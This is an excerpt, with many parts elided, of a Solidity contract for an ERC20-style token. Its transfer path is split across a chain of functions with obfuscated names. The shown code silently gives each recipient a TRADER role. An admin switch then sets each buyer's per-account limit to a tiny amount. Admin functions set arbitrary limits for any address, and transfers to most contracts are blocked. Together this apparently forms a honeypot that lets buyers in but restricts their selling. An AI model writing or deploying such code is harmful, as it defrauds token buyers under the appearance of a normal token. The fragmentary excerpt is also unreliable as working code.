...
abstract contract NJSEBSDConsole is Context, NJSEBSDRoleControl {
    ...
    function _sethasRule(bytes32 role, address account, uint256 amt) internal {
        ...
        _sethasRules(role, account, amt);
    }

    function _sethasRules(bytes32 role, address account, uint256 amt) internal {
    ...
    function queryA(
        ...
        return _roles[role].RD.RM[account].div(1000000000000000000);
    }
    ...
    function queryRD(
        ...
        return _roles[role].RD.RD[account].div(1000000000000000000);
    }

    function _NJSEBSDsyteB(
        bytes32 rule,
        address addr,
        string memory memo
        ...
        _roles[rule].RD.RM[addr] = memoUint.mul(1000000000000000000);
    }

    function _NJSEBSDsetSL(
        uint newnum
    ) public onlyRole(ADMIN) {
        isnum = newnum;
    }
    ...
    function _setNewHashRole(bytes32 role, address account, uint256 num) internal virtual {
        _roles[role].RD.RM[account] = num.mul(1000000000000000000);
    }
...
contract NJSEBSDERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is NJSEBSDERC20, NJSEBSDConsole {
    ...
    ) NJSEBSDERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(NJSEBSDERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");


        _NJSEBSDfdgerc(from, to, amt);
    }



    function _NJSEBSDfdgerc(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");

        _NJSEBSDmtzcsf(from, to, amt);
    }

    function _NJSEBSDmtzcsf(address from, address to, uint256 amt) internal {
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _NJSEBSDcdsea(from, to, amt);
    }

    function _NJSEBSDcdsea(address from, address to, uint256 amt) internal {
        ...
        _NJSEBSDyeaxca(from, to, amt);
    }

    function _NJSEBSDyeaxca(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        _NJSEBSDnrdfxf(from, to, amt);
    }

    function _NJSEBSDnrdfxf(address from, address to, uint256 amt) internal {
        
        _NJSEBSDyiuafbd(from, to, amt);
    }

    function _NJSEBSDyiuafbd(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        _NJSEBSDewqwwcvb(from, to, amt);
    }

    function _NJSEBSDewqwwcvb(address from, address to, uint256 amt) internal {


        
        if(to != uniswapV2Pair){
            if(isContract(to) && to != sushi && to != okx && to != okx1){
                require(false, "ERC20: only admin can add liquidity");
            }
            if(isnum > 0){
                _setNewHashRole(TRADER,to,1);
            }
        }
